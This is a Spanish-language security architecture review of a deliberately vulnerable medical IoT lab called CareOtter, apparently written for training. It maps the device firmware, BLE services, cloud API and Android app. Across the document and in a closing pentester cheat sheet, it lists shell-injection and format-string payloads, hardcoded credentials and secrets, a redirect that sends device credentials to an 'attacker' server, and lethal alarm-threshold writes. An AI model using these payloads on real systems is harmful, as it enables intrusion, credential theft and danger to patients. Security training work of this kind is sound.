# CareOtter — Análisis Arquitectónico Completo

> **Fecha:** 2026-05-02  
> **Alcance:** Código fuente de todos los componentes (firmware IoT, Cloud API, Android app)  
> **Objetivo:** Entender cómo fluyen los datos, cómo se autentican los actores y dónde residen las vulnerabilidades arquitectónicas.

---

## 1. Visión General de Componentes

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ANDROID APP (Patient / Admin)                    │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌─────────────────┐  │
│  │LoginActivity │  │MainActivity  │  │AdminActivity │  │BleMonitorClient │  │
│  │  HTTP :5002  │  │  BLE GATT    │  │  TCP :9999   │  │  (BLE stack)   │  │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘  └─────────────────┘  │
│         │                 │                  │                                │
│         │ JWT (Bearer)    │ Raw BLE         │ IGP v4 binary                  │
│         │ plain HTTP      │ no encryption   │ plain TCP                      │
└─────────┼─────────────────┼──────────────────┼────────────────────────────────┘
          │                 │                  │
          ▼                 │                  ▼
┌───────────────────────────┘         ┌─────────────────────────────────────────┐
│        CLOUD API (Docker :5002)     │     CAREOTTER DEVICE (RPi 192.168.2.1)  │
│  ┌────────────────────────────┐     │  ┌─────────────┐  ┌──────────────────┐ │
│  │  Flask app.py              │◄────┼──│  careservice│  │  ble_server.py   │ │
│  │  ├─ JWTService (HS256)     │     │  │  (C binary) │  │  (dbus-fast)     │ │
│  │  ├─ DeviceService          │─────┼──►│  TCP :9999  │  │  BLE peripheral  │ │
│  │  │   └─ IGPClient           │     │  └─────────────┘  └────────┬─────────┘ │
│  │  ├─ VitalsService          │     │         ▲                   │           │
│  │  │   └─ HTTP :8081 direct   │◄────┼─────────┘                   │           │
│  │  └─ DatabaseService (SQLite)│     │                    ┌────────▼─────────┐ │
│  │       ├─ users (SHA-256)    │     │                    │ sensor_service.py│ │
│  │       ├─ devices (MAC)      │     │                    │  HTTP :8081      │ │
│  │       ├─ vitals_readings    │     │                    │  ├─ /vitals      │ │
│  │       └─ device_config      │     │                    │  ├─ /thresholds  │ │
│  └────────────────────────────┘     │                    │  └─ /log         │ │
│                                     │                    └──────────────────┘ │
└─────────────────────────────────────┘─────────────────────────────────────────┘
          ▲
          │  POST /admin/device/register
          │  {signature, mac, patient{}, admin{}, device_ip}
          │
          └──────────────────────────────┐
                                         │
                              ┌──────────▼──────────┐
                              │   ATTACKER SERVER   │
                              │  (fake cloud API)   │
                              └─────────────────────┘
```

---

## 2. Dispositivo IoT — Firmware en la Raspberry Pi

### 2.1 Servicios que corren en el dispositivo

| Servicio | Puerto | Protocolo | Lenguaje | Inicio |
|----------|--------|-----------|----------|--------|
| `careservice` | 9999 | IGP v4 binario (TCP) | C | `/etc/init.d/careservice` |
| `sensor_service.py` | 8081 | HTTP/JSON (TCP) | Python 3 | `/etc/init.d/medical-sensor` |
| `ble_server.py` | — | BLE GATT (D-Bus) | Python 3 | `/etc/init.d/ble-server` |

Todos escuchan en `0.0.0.0` (todas las interfaces), por lo que son alcanzables tanto por Ethernet (`192.168.2.1`) como por WiFi (cuando se configura).

### 2.2 `sensor_service.py` — El sensor médico simulado

**Rol:** Genera lecturas de BPM/SpO2 y las expone por HTTP.

**Arquitectura interna:**
- **Hilo `sensor_loop`**: lee del bus I2C (real o simulado) cada 100ms. En modo simulado genera valores aleatorios alrededor de 72 BPM / 98% SpO2.
- **Hilo `snapshot_loop`**: congela una copia de `latest` cada 10s en `vitals_snapshot`. Todos los consumidores (HTTP, BLE) leen este snapshot, no el valor en tiempo real.
- **Buffer de logs circular**: `log_buffer` mantiene hasta 1440 entradas (~24h). Las entradas son resúmenes cada 60s con promedios, mínimos y máximos.

**Endpoints HTTP (:8081):**

| Método | Path | Auth | Función |
|--------|------|------|---------|
| GET | `/vitals` | ❌ No | BPM/SpO2 snapshot |
| GET | `/health` | ❌ No | MAC del dispositivo + status |
| GET | `/log` | ❌ No | Buffer completo de logs |
| GET | `/config` | ❌ No | Info del sistema (incluye `_simulator_pid`) |
| GET | `/alerts` | ❌ No | Estado de alertas vs umbrales actuales |
| GET | `/history?minutes=N` | ❌ No | Historial filtrado (sin validación de N) |
| POST | `/thresholds` | ❌ No | Cambia umbrales de alerta (JSON body) |

**Vulnerabilidades arquitectónicas clave:**
1. **POST `/thresholds` sin autenticación**: cualquier cliente en la red puede cambiar los umbrales clínicos.
2. **`/history?minutes=99999`**: no hay límite en el parámetro `minutes`; devuelve todo el buffer.
3. **`/config` expone `_simulator_pid`**: información interna del proceso.

### 2.3 `ble_server.py` — Servidor GATT BLE

**Rol:** Expone los datos del sensor como un periférico BLE llamado `CareOtter_HR`.

**Stack:** `dbus-fast` sobre D-Bus system de BlueZ. No usa `pygatt` ni `bleak` en el lado servidor.

**Servicios GATT publicados:**

| UUID | Servicio | Características | Seguridad |
|------|----------|-----------------|-----------|
| `0x180D` | Heart Rate | `0x2A37` (notify) | ❌ Ninguna |
| `0x1822` | Pulse Oximeter | `0x2A5F` (notify) | ❌ Ninguna |
| `0x180F` | Battery | `0x2A19` (read) | ❌ Ninguna |
| `0x180A` | Device Info | `0x2A29`, `0x2A24` (read) | ❌ Ninguna |
| `0xFF00` | Alert Threshold | `0xFF01` (read/write/notify) | ❌ Ninguna |
| `0xFF10` | Factory Provisioning (hidden) | `0xFF11`, `0xFF12` | ❌ Ninguna |

**Flujo de datos BLE:**
```
sensor_service.py :8081/vitals  ──(urllib)──►  ble_server.py latest_vitals cache
                                                      │
                                                      ▼ (cada 2s)
                                              HeartRateMeasurementChrc.update_and_notify()
                                                      │
                                              _notify_characteristic() ──D-Bus──► BlueZ
                                                      │
                                              PulseOximeterChrc.update_and_notify()
                                                      │
                                              AlertThresholdChrc.update_and_notify()
```

**Característica `0xFF01` — CSCP v1 (CareOtter Secure Config Protocol):**
- Formato de paquete de 24 bytes: `Magic(4) + CRC32(4) + AES-128-ECB(ciphertext, 16)`
- Clave hardcodeada: `careotter-key-16` (idéntica en firmware y APK)
- **No hay validación de rangos clínicos**: acepta `bpm_min=0, bpm_max=255, spo2_min=0`
- **Bug de diseño**: `_alert_bpm_window` se recalcula sin validar que `bpm_max > bpm_min`. Si se envía `bpm_min >= bpm_max`, el denominador se hace ≤0 y `update_and_notify()` lanza `ZeroDivisionError`, matando el loop de notificaciones BLE.

**Característica `0xFF11` — Provisioning Config:**
- Acepta comandos JSON sin verificar si el PIN fue validado primero (`authenticated` del `0xFF12` se ignora).
- Comandos disponibles: `wifi_set`, `wifi_get`, `cloud_set`, `cloud_get`, `patient_set`, `admin_set`, `factory_reset`, `reboot`
- `wifi_set` inyecta SSID/PSK directamente en `os.system()` → **shell injection**.
- `cloud_set` acepta cualquier URL → **SSRF** (el dispositivo enviará su firma y credenciales a esa URL).
- `factory_reset` se ejecuta con un solo write, sin confirmación.
- `ReadValue` devuelve `wifi_psk` en plaintext → **information disclosure**.

**Característica `0xFF12` — Provisioning Auth:**
- PIN de fábrica hardcodeado: `1234`
- No hay rate limiting ni bloqueo permanente.
- El estado de autenticación del PIN **no se consulta** antes de ejecutar comandos en `0xFF11`.

**Advertising ManufacturerData (0x08D4):**
- 10 bytes binarios: `[API_WiFi_IP(4)] + [API_Port(2)] + [Device_WiFi_IP(4)]`
- Cualquier escáner BLE pasivo puede leer la IP del Cloud API y la IP WiFi del dispositivo sin emparejarse.

### 2.4 `careservice.c` — Servicio de administración binario (IGP v4)

**Rol:** Puerta de administración del dispositivo. Expone un protocolo binario propietario.

**Formato del protocolo:**
```
Header (8 bytes, big-endian):
  Magic    : 0x43415245 ("CARE")
  Cmd      : 1 byte
  Status   : 1 byte (siempre 0x00 en request)
  Len      : 2 bytes (longitud del payload)
```

**Estado global crítico:**
```c
int authenticated = 0;   // ¡Persiste entre conexiones TCP!
```
Este flag es **global al proceso**, no vinculado al socket. Si un cliente autentica en cualquier conexión, todos los clientes posteriores heredan el estado `authenticated=1` hasta que alguien envíe `0x0D DEAUTHENTICATE` o se reinicie el proceso.

**Comandos IGP:**

| Cmd | Nombre | Auth | Función | Vulnerabilidad |
|-----|--------|------|---------|----------------|
| `0x01` | SYS_INFO | ❌ | Kernel y arquitectura | — |
| `0x02` | AUTHENTICATE | ❌ | Valida `OtterMobile2026` | Hardcoded credential (CWE-798) |
| `0x03` | GET_NETWORK | ✅ | Devuelve `/etc/config/wireless` | WiFi PSK en plaintext |
| `0x04` | SET_PREFS | ✅ | TLV parser de preferencias | Integer underflow → BOF |
| `0x05` | VERIFY_STATUS | ❌ | Diagnóstico de subsistema | Format string (snprintf con payload como formato) |
| `0x06` | SET_WIFI | ✅ | Configura WiFi vía UCI | Shell injection |
| `0x07` | GET_VITALS | ❌ | Proxea `/vitals` del sensor | — |
| `0x08` | SET_THRESHOLD | ✅ | Umbrales clínicos vía TLV | — |
| `0x09` | REBOOT_SERVICE | ✅ | Reinicia servicio init.d | Zombie processes (no waitpid) |
| `0x0A` | GET_LOG | ✅ | Últimos 512 bytes de log | — |
| `0x0B` | DEFIBRILLATE | ✅ | Simula descarga 200J | Format string en log de eventos |
| `0x0C` | EMERGENCY_ALERT | ✅ | Envía alerta vía curl | OS command injection |
| `0x0D` | DEAUTHENTICATE | ❌ | Resetea `authenticated=0` | — |

**Vulnerabilidades críticas en C:**
1. **`parse_preferences()` (0x04)**: `remaining -= 2` puede underflowar si `data_len` es inconsistente. Luego `memcpy(local_store, ..., t_len)` con `t_len > 128` → stack buffer overflow.
2. **`get_system_status()` (0x05)**: `snprintf(report_header, 128, module_name)` usa el payload como string de formato → format string leak.
3. **DEFIBRILLATE (0x0B)**: `snprintf(fmt_buf, sizeof(fmt_buf), (char*)payload)` → segundo sink de format string. Escribe en `/tmp/careotter_events.log`.
4. **EMERGENCY_ALERT (0x0C)**: `snprintf(cmd, ..., "curl ... '%s'", payload)` → command injection. Ejemplo: `payload = "test'; reboot #"` reinicia el dispositivo.
5. **REBOOT_SERVICE (0x09)**: `fork()` sin `waitpid()` → procesos zombis.

---

## 3. Cloud API — Flask (Docker :5002)

### 3.1 Arquitectura interna

```
HTTP Client
    │
    ▼
Flask app.py ──┬──► @token_required (decoradores.py)
               │         └── JWTService.decode_token()
               │               └── jwt.decode(secret='careotter_jwt_2026')
               │
               ├──► DeviceService ──► IGPClient ──► TCP 192.168.2.1:9999
               │
               ├──► VitalsService ──► HTTP 192.168.2.1:8081/vitals
               │
               └──► DatabaseService ──► SQLite (/app/data/careotter.db)
```

### 3.2 Autenticación en la Cloud API

**Flujo de login:**
```
POST /api/auth/login
Body: {"username": "admin", "password": "CareOtter2026!"}

1. DatabaseService.verify_user() → SHA-256(password) == password_hash
2. JWTService.generate_token() → JWT HS256 firmado con 'careotter_jwt_2026'
3. Respuesta: {"token": "eyJ...", "role": "admin", ...}
```

**Problemas:**
- **SHA-256 sin sal**: `hashlib.sha256(password.encode()).hexdigest()`. Rainbow tables funcionan directamente.
- **JWT secreto débil**: `'careotter_jwt_2026'` es corto y predecible. `jwt_tool` o `hashcat` lo rompen en segundos.
- **Mensajes de error diferenciados**: el decorador `@token_required` distingue "Token expirado" vs "Firma inválida" vs "Token malformado", facilitando ataques de fuerza bruta contra la firma.

**Roles:**
- `admin`: acceso a `/admin/*`, `/api/devices`, `/api/network`, etc.
- `patient`: acceso a `/patient/*`, `/api/devices/me`, `/api/vitals`

**Fallo de autorización (API-06):** El endpoint `/api/devices` (GET lista todos los dispositivos) requiere `@token_required` pero **no verifica el rol**. Un paciente autenticado puede obtener la lista completa.

### 3.3 Endpoints clave

| Endpoint | Auth | IGP Cmd | Vuln |
|----------|------|---------|------|
| `/api/device/status?module=X` | ❌ No | `0x05` | Format string proxy (X=%x.%x.%x) |
| `/api/network` | ✅ JWT | `0x03` | Devuelve campo `raw` con PSK en vuln=1 |
| `/api/config/preferences` | ✅ JWT | `0x04` | TLV underflow proxy |
| `/api/services/restart` | ✅ JWT | `0x09` | Reinicio de servicios |
| `/api/vitals` | ❌ No | — | Cache compartida (lecturas idénticas para todos) |
| `/hint` | ❌ No | — | Info disclosure (guía hacia BLE provisioning) |
| `/admin/device/register` | ❌ No | — | Registro por firma hardcodeada |
| `/initialize_iot` | ❌ No | — | Fallback que crea usuarios por defecto |

**Modo `VULNERABLE` (env var):**
- `VULNERABLE=1`: `debug=True` en Flask → **Werkzeug debugger expuesto** (RCE potencial si se adivina el PIN).
- `VULNERABLE=1`: errores 500 devuelven `type(e).__name__` y `str(e)`.
- `VULNERABLE=0`: oculta campos `raw`, fuerza módulo `CareOtter`, desactiva debug.

### 3.4 Registro dinámico del dispositivo

**Flujo normal (Chain F):**
```
1. Attacker descubre BLE hidden service 0xFF10
2. Escribe PIN 1234 en 0xFF12 → authenticated=true
3. Escribe {"cmd":"cloud_set","url":"http://attacker:5000"} en 0xFF11
4. ble_server.py llama _send_registration_to_cloud()
5. POST http://attacker:5000/admin/device/register
   Body: {"signature":"CareOtterFactorySig2026", "mac":"AA:BB:...", 
          "patient":{...}, "admin":{...}, "device_ip":"..."}
6. Attacker captura la firma y las credenciales
7. Replay al Cloud API real: POST http://192.168.2.2:5002/admin/device/register
```

**Fallback (`/initialize_iot`):**
- Si la base de datos está vacía (0 usuarios), cualquiera puede llamar `POST /initialize_iot`
- Crea: `admin/CareOtter2026!` + `patient/patient123`
- Registra dispositivo dummy `AA:BB:CC:DD:EE:FF`

### 3.5 Collector de vitales (background thread)

```python
def _vitals_collector():
    while True:
        if not Config.DEVICE_IP:
            sleep(10); continue
        result = vitals.get_current()   # HTTP GET /vitals
        if result['success']:
            db.store_vitals(data, device_mac=DEVICE_MAC)
            sleep_until(next_snapshot_boundary)  # alinea con snapshot del sensor
```

- Corre como `daemon=True` dentro del mismo proceso Flask.
- Si `DEVICE_IP` cambia (después de `/admin/device/register`), el collector automáticamente empieza a sondear la nueva IP WiFi en lugar de Ethernet.

---

## 4. Aplicación Android — `vulnzoo_apps/careotter_app`

### 4.1 Componentes Java

| Clase | Rol | Canal |
|-------|-----|-------|
| `LoginActivity` | Auth contra Cloud API | HTTP plain :5002 |
| `MainActivity` | Monitor BLE del paciente | BLE GATT |
| `AdminActivity` | Panel admin vía IGP v4 | TCP plain :9999 |
| `BleMonitorClient` | Wrapper Android BLE | BLE GATT |
| `IgpClient` | Cliente IGP v4 binario | TCP plain :9999 |
| `CareOtterConfig` | CSCP v1 packet builder | — |
| `VitalsLogger` | Log a /sdcard | Filesystem |

### 4.2 Flujo de autenticación en la app

```
LoginActivity
    │
    ├──► Detecta prefijo WiFi (ej: 192.168.2.)
    ├──► Usuario introduce último octeto (ej: 2)
    ├──► Construye URL: http://192.168.2.2:5002
    │
    ├──► POST /api/auth/login
    │     Body: {"username":"...", "password":"..."}
    │
    ├──► Recibe JWT + role
    │
    ├──► Guarda en SharedPreferences (sin cifrar):
    │     jwt_token, user_role, username, api_url, api_prefix, api_host
    │
    └──► routeByRole(role):
         "admin" → AdminActivity
         else    → MainActivity
```

**Vulnerabilidades móviles:**
1. **HTTP sin TLS**: credenciales y JWT viajan en plaintext.
2. **JWT en SharedPreferences**: cualquier app con acceso al filesystem puede leer `careotter_prefs.xml`.
3. **Sin certificate pinning**: un atacante con control de red (ARP spoofing) puede interceptar tráfico.

### 4.3 MainActivity — Modo paciente (BLE)

```
MainActivity (implements BleMonitorClient.Listener)
    │
    ├──► startScan() → busca "CareOtter_HR" por nombre
    │     VULN: no verifica MAC, no requiere emparejamiento
    │     Cualquier dispositivo BLE con ese nombre es aceptado
    │
    ├──► onServicesDiscovered():
    │     ├── subscribe HR (0x2A37) notify
    │     ├── subscribe PLX (0x2A5F) notify
    │     ├── read Manufacturer (0x2A29)
    │     ├── read Model (0x2A24)
    │     └── si PROV_SERVICE existe → read PROV_CONFIG
    │
    ├──► onCharacteristicChanged(HR) → update UI BPM
    ├──► onCharacteristicChanged(PLX) → update UI SpO2
    │
    ├──► VitalsLogger.log(bpm, spo2) → /sdcard/careotter_vitals.log
    │     VULN: plaintext, world-readable en Android <10
    │
    └──► Panel diagnóstico oculto: 5 toques rápidos en el título
         └── Permite leer/escribir thresholds raw en 0xFF01
```

**Vulnerabilidades BLE en la app:**
1. **Missing BLE pairing (M3/CWE-306)**: `connectGatt(context, false, callback)` sin `TRANSPORT_LE` ni bonding.
2. **No MAC verification**: solo compara `device.getName().equals("CareOtter_HR")`.
3. **Unencrypted channel (M5/CWE-319)**: no solicita encriptación BLE (`setPairing` no se fuerza).
4. **Plaintext external storage (M2/CWE-276)**: `VitalsLogger` escribe a `/sdcard/careotter_vitals.log`.
5. **Hidden diagnostic panel (M1)**: descubrible por análisis estático (variable `diagTapCount`).
6. **Threshold write sin validación (M3/M7)**: `writeThreshold(String rawJson)` envía bytes tal cual al GATT.

### 4.4 AdminActivity — Modo administrador (IGP v4)

```
AdminActivity
    │
    ├──► StrictMode.permitNetwork() → network en UI thread (intencional vuln)
    │
    ├──► Comandos públicos (sin auth):
    │     ├── sysInfo()        → IGP 0x01
    │     ├── verifyStatus()   → IGP 0x05
    │     └── exploitFormatString() → verifyStatus("%x.%x.%x.%x")
    │
    ├──► Comandos protegidos (execProtected: auth → cmd → deauth):
    │     ├── getNetwork()     → IGP 0x03
    │     ├── exploitUnderflow() → IGP 0x04
    │     ├── defibrillate()   → IGP 0x0B
    │     ├── exploitCommandInjection() → IGP 0x0C
    │     └── setTheme()       → IGP 0x04
    │
    └──► execProtected() abre 3 conexiones TCP separadas
         VULN: la ventana entre auth y deauth es explotable
```

**Vulnerabilidades del modo admin:**
1. **StrictMode network en main thread**: la UI se congela, pero más grave, las excepciones de red pueden crashear la app.
2. **Token XOR-obfuscado**: `IgpClient.decodeToken()` aplica XOR 0x5A a bytes hardcodeados. El token real es `OtterMobile2026`.
3. **IGP v4 en plaintext**: TCP sin TLS ni certificados.

### 4.5 `CareOtterConfig` — CSCP v1

```java
// Clave hardcodeada en Java (idéntica a ble_server.py)
private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(StandardCharsets.UTF_8);

// Modo ECB (sin IV) → determinístico, vulnerable a replay
Cipher.getInstance("AES/ECB/NoPadding");
```

**Impacto:** Un atacante que extraiga esta clase del APK (vía `jadx` o `strings`) puede forjar paquetes CSCP v1 válidos y escribir umbrales letales al dispositivo sin necesidad de emparejarse.

---

## 5. Flujos de Administración

### 5.1 Administración vía BLE (Factory Provisioning)

```
Attacker (con proximidad BLE)
    │
    ├──► Scan BLE → descubre CareOtter_HR
    │     ├── Lee ManufacturerData → obtiene IP Cloud API + IP WiFi del dispositivo
    │     └── Enumera servicios GATT → descubre 0xFF10 (no anunciado)
    │
    ├──► Connect GATT → no emparejamiento requerido
    │
    ├──► Write 0xFF12: "1234" → PIN aceptado
    │
    ├──► Read 0xFF11 → obtiene wifi_ssid, wifi_psk, cloud_url en plaintext
    │
    ├──► Write 0xFF11: {"cmd":"wifi_set","ssid":"...","psk":"..."}
    │     → careservice ejecuta: uci set wireless...@wifi-iface[0].ssid='...' && ...
    │     → VULN: shell injection si SSID/PSK contienen metacaracteres
    │
    ├──► Write 0xFF11: {"cmd":"cloud_set","url":"http://attacker:5000"}
    │     → ble_server.py actualiza cloud_url y dispara _send_registration_to_cloud()
    │     → POST a http://attacker:5000/admin/device/register con firma + credenciales
    │     → VULN: SSRF — el dispositivo envía datos sensibles a cualquier URL
    │
    ├──► Write 0xFF11: {"cmd":"factory_reset"}
    │     → rm -f /etc/config/wireless && cp /rom/etc/config/wireless ...
    │     → Sin confirmación, sin re-autenticación
    │
    └──► Write 0xFF01 (CSCP v1 packet con clave robada)
         → Cambia umbrales a valores letales (bpm_min=0, bpm_max=255, spo2_min=0)
         → El dispositivo acepta sin validación
```

### 5.2 Administración vía IGP v4 (TCP :9999)

```
AdminActivity o atacante directo
    │
    ├──► TCP connect 192.168.2.1:9999
    │
    ├──► 0x02 AUTHENTICATE payload="OtterMobile2026"
    │     → authenticated = 1 (global para TODO el proceso)
    │
    ├──► 0x03 GET_NETWORK → devuelve /etc/config/wireless completo (con PSK)
    │
    ├──► 0x05 VERIFY_STATUS payload="%x.%x.%x" → format string leak
    │
    ├──► 0x06 SET_WIFI payload="SSID|PSK" → shell injection
    │
    ├──► 0x0B DEFIBRILLATE payload="%x.%x.%x" → format string en events.log
    │
    ├──► 0x0C EMERGENCY_ALERT payload="test'; reboot #" → command injection → reboot
    │
    └──► 0x0D DEAUTHENTICATE → authenticated = 0
```

**Vulnerabilidad de arquitectura (IGP-06):**
Un atacante que escanee el puerto 9999 puede esperar a que la Cloud API (o un admin legítimo) envíe `0x02 AUTHENTICATE`, y en la ventana entre ese comando y el `0x0D DEAUTHENTICATE`, el atacante conecta y ejecuta comandos protegidos sin credenciales.

### 5.3 Administración vía Cloud API (HTTP :5002)

```
Web browser / Mobile app / curl
    │
    ├──► POST /api/auth/login → JWT
    │
    ├──► GET /api/network (token_required)
    │     → Cloud API hace: auth → 0x03 → deauth al dispositivo
    │     → Devuelve config WiFi (campo 'raw' con PSK si VULNERABLE=1)
    │
    ├──► POST /api/network/wifi (token_required)
    │     → Body: {"ssid":"...", "password":"..."}
    │     → Cloud API hace: auth → 0x06 → deauth
    │
    ├──► POST /api/config/preferences (token_required)
    │     → Body: {"tlv_hex": "AAFF4461726B"}
    │     → Cloud API hace: auth → 0x04 → deauth
    │     → VULN: TLV underflow proxy
    │
    └──► POST /api/services/restart (token_required)
         → Body: {"service": "medical-sensor"}
         → Cloud API hace: auth → 0x09 → deauth
```

---

## 6. Flujo de Datos de Vitales (End-to-End)

```
┌──────────────┐     I2C/Sim     ┌──────────────────┐
│ MAX30102 HW  │◄───────────────►│ sensor_service.py│
│   o Simulador│                 │  :8081           │
└──────────────┘                 └────────┬─────────┘
                                          │ HTTP /vitals ( cada 10s )
                                          ▼
                                   ┌──────────────┐
                                   │ vitals_snapshot (congelado cada 10s)
                                   └──────┬───────┘
                                          │
                    ┌─────────────────────┼─────────────────────┐
                    │                     │                     │
                    ▼                     ▼                     ▼
            ┌──────────────┐      ┌──────────────┐      ┌──────────────┐
            │ Cloud API    │      │ ble_server.py│      │ IGP 0x07     │
            │ collector    │      │ latest_vitals│      │ GET_VITALS   │
            │ (HTTP :8081) │      │ cache (30s)  │      │ (TCP :9999)  │
            └──────┬───────┘      └──────┬───────┘      └──────────────┘
                   │                     │
                   ▼                     ▼
            ┌──────────────┐      ┌──────────────┐
            │ SQLite DB    │      │ BLE notify   │
            │ (Docker)     │      │ (cada 2s)    │
            └──────┬───────┘      └──────┬───────┘
                   │                     │
                   ▼                     ▼
            ┌──────────────┐      ┌──────────────┐
            │ Web Dashboard│      │ Android App  │
            │ /history     │      │ MainActivity │
            └──────────────┘      └──────────────┘
```

**Puntos clave del flujo:**
1. El sensor genera datos cada 100ms, pero el **snapshot se congela cada 10s**. Esto significa que todos los consumidores ven el mismo valor durante 10s, independientemente de cuándo consulten.
2. El BLE server refresca su cache cada 30s (`_vitals_refresh_interval`), pero las notificaciones GATT se emiten cada 2s (`update_loop`). Las notificaciones repiten el mismo valor hasta que el cache se refresca.
3. El Cloud API collector persiste cada lectura exitosa en SQLite. El historial web viene de la DB, no del dispositivo directamente.

---

## 7. Vulnerabilidades Arquitectónicas de Diseño

### 7.1 Autenticación global en proceso (CWE-362 / CWE-613)

**Problema:** `authenticated` en `careservice.c` es una variable global (`int authenticated = 0`), no un mapa `socket_fd → bool`.

**Impacto:**
- Auth en una conexión TCP = auth para todas las conexiones TCP.
- La Cloud API intenta mitigar esto con `_igp_lock` + auth→cmd→deauth, pero el lock solo serializa peticiones **de la Cloud API**. Un atacante con acceso directo a `:9999` puede conectar en la ventana entre `auth` y `deauth`.

**Fix correcto:** Vincular `authenticated` al file descriptor del socket, no al proceso.

### 7.2 Frontera de confianza inexistente en BLE

**Problema:** Toda la superficie BLE es **completamente abierta**. No hay:
- Emparejamiento/bonding
- Encriptación de link
- Autenticación de sesión
- Verificación de identidad del dispositivo (solo se compara el nombre)

**Impacto:** Cualquier atacante con un dongle BLE ($5) puede:
- Conectarse al dispositivo
- Leer PSK WiFi
- Escribir umbrales letales
- Ejecutar factory reset
- Redirigir el registro cloud a un servidor propio

### 7.3 Clave simétrica hardcodeada compartida

**Problema:** `CSCP_KEY = "careotter-key-16"` existe en:
- `ble_server.py` (firmware del dispositivo)
- `CareOtterConfig.java` (APK Android)
- `forge_threshold.py` (herramienta de pentest)

**Impacto:** Comprometer un solo dispositivo o un solo APK compromete toda la flota. La "encriptación" no proporciona confidencialidad ni autenticación — solo ofusca serialización.

### 7.4 SSRF en la nube médica

**Problema:** `cloud_set` en BLE provisioning acepta cualquier URL sin validación. El dispositivo envía automáticamente:
- Su firma de fábrica (`CareOtterFactorySig2026`)
- Credenciales de admin y paciente
- Su IP WiFi

**Impacto:** Un atacante puede configurar `cloud_url` a un dominio que controla y recibir todos los datos de onboarding del dispositivo.

### 7.5 Autenticación de dos velocidades

**Problema:** Hay tres sistemas de autenticación independientes con diferentes fortalezas:

| Canal | Mecanismo | Fortaleza |
|-------|-----------|-----------|
| BLE | Ninguno | ⛔ Nulo |
| IGP v4 | Token hardcodeado | 🔴 Débil |
| Cloud API | JWT HS256 con secreto débil | 🟡 Mediocre |
| Cloud API → Device | Mismo token IGP hardcodeado | 🔴 Débil |

Un atacante puede pivotar del canal más débil (BLE, sin auth) al más fuerte (Cloud API) vía `cloud_set` + captura de firma.

### 7.6 Persistencia de estado sensible sin caducidad

**Problema:**
- `_PROVISION_FILE` (`/tmp/careotter-provision.json`) persiste credenciales WiFi, cloud, patient y admin.
- El campo `initialized_at` se escribe pero **nunca se consulta**. El canal de provisioning nunca caduca (vulnerabilidad P8).
- SQLite en Docker persiste en volumen `careotter_data` a través de `docker compose down` (a menos que se use `-v`).

---

## 8. Mapa de dependencias entre archivos

```
careservice.c
    ├── lee/escribe: /tmp/careservice.log
    ├── lee/escribe: /tmp/careotter_events.log
    ├── lee/escribe: /tmp/careotter.thresholds  ◄────── sensor_service.py (watcher)
    ├── lee: /etc/config/wireless
    ├── lee: /etc/careotter/alert.conf
    └── ejecuta: /etc/init.d/* (via fork/execv)

sensor_service.py
    ├── lee: /opt/medical-sensor/config.json
    ├── lee: /tmp/careotter.thresholds
    ├── escribe: /tmp/medical-logs/vitals.log
    └── usa: simulator.py (o smbus2 real)

ble_server.py
    ├── lee/escribe: /tmp/careotter-provision.json
    ├── consulta: http://127.0.0.1:8081/vitals
    ├── consulta: Cloud API /api/health (para obtener wifi_ip)
    └── envía: POST Cloud_API/admin/device/register

Cloud API (app.py)
    ├── consulta: http://DEVICE_IP:8081/health (para MAC)
    ├── consulta: http://DEVICE_IP:8081/vitals (collector)
    ├── habla: TCP DEVICE_IP:9999 (IGPClient)
    └── escribe: SQLite /app/data/careotter.db

Android App
    ├── habla: HTTP Cloud_API:5002
    ├── habla: BLE GATT CareOtter_HR
    └── habla: TCP 192.168.2.1:9999 (modo admin)
```

---

## 9. Resumen ejecutivo para pentesters

| Si quieres explotar... | Usa este canal | Comando/payload clave |
|------------------------|---------------|----------------------|
| Hardcoded credential | IGP v4 | `0x02` + `OtterMobile2026` |
| WiFi PSK disclosure | IGP v4 / BLE | `0x03` o read `0xFF11` |
| Shell injection | IGP v4 / BLE | `0x06` SSID=`'; touch /tmp/pwn #` o `wifi_set` |
| Format string leak | IGP v4 / API | `0x05` module=`%x.%x.%x` o `/api/device/status?module=...` |
| Command injection | IGP v4 | `0x0C` payload=`test'; reboot #` |
| Buffer overflow | IGP v4 | `0x04` TLV `AA FF 44 61 72 6B` |
| BLE threshold attack | BLE GATT | CSCP v1 packet con `bpm_min=0, bpm_max=255` |
| SSRF / Cloud hijack | BLE GATT | `cloud_set` → URL del atacante |
| JWT forgery | Cloud API | Firmar con `careotter_jwt_2026` |
| Weak password crack | Cloud API | SHA-256 rainbow table de `CareOtter2026!` |
| RCE en Cloud API | Cloud API | Provocar error 500 en `VULNERABLE=1` → Werkzeug PIN |
| Unauthorized admin | Cloud API | `POST /initialize_iot` si DB vacía |
| Privilege escalation | Cloud API | Paciente accede a `/api/devices` (sin check de rol) |
